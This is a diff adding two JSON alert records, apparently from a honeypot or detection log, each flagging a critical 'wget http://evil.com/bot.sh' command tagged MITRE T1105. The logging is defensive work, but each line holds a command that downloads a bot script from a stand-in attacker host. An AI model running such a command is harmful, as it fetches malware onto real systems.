@@ -1,0 +1,2 @@
+{"alert_time": "2026-01-29T18:01:22.370264Z", "src_ip": "127.0.0.1", "command": "wget http://evil.com/bot.sh", "severity": "CRITICAL", "mitre": "T1105"}
+{"alert_time": "2026-01-29T18:11:21.411696+00:00", "src_ip": "127.0.0.1", "command": "wget http://evil.com/bot.sh", "severity": "CRITICAL", "mitre": "T1105"}
